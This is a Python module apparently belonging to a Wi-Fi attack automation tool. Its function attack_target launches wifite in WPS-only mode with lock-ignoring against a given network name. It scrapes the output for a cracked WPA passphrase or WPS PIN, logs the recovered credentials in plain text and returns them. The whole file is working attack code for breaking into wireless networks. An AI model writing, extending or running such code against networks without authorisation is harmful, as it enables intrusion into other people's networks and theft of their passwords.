import subprocess
import time
import re
import logging
from utils import strip_ansi

def attack_target(interface, essid):
    logging.info(f"Starting attack on {essid}...")
    proc = subprocess.Popen(
        ["wifite", "--wps-only", "--ignore-locks", "-i", interface, "-e", essid],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )

    psk = None
    pin = None
    start_time = time.time()

    for line in proc.stdout:
        line = strip_ansi(line.strip())
        if not line:
            continue
        logging.debug(f"[wifite] {line}")

        if "WPA PSK:" in line or "PSK/Password:" in line:
            match = re.search(r'(?:WPA PSK|PSK/Password):\s*(.+)', line)
            if match:
                psk_candidate = match.group(1).strip().strip("'\"")
                if psk_candidate.lower() != "n/a":
                    psk = psk_candidate
                    logging.info(f"PSK found for {essid}: {psk}")
                    break

        if "WPS PIN:" in line or "Cracked WPS PIN:" in line:
            match = re.search(r'WPS PIN:\s*([0-9]{8})', line)
            if match:
                pin = match.group(1).strip()
                logging.info(f"WPS PIN found for {essid}: {pin}")

        if time.time() - start_time > 360:
            logging.warning(f"Attack timeout (360s) reached for {essid}, terminating.")
            proc.terminate()
            break

    proc.terminate()

    if psk:
        return {"psk": psk, "pin": pin}
    elif pin:
        return {"pin": pin}
    else:
        logging.info(f"Attack on {essid} failed. No credentials obtained.")
        return None
